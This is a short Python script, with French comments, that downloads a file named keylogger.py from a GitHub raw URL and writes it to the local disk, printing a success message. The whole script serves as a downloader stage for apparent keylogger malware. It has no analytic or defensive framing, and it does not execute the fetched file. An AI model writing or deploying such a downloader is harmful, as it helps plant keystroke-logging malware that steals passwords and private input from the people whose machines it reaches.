import requests


url = 'https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/keylogger.py'

filename = 'keylogger.py'

response = requests.get(url)

if response.status_code == 200:
    # Sauvegarder le fichier localement
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(response.text)

    print(f'Le fichier {filename} a été téléchargé avec succès.')


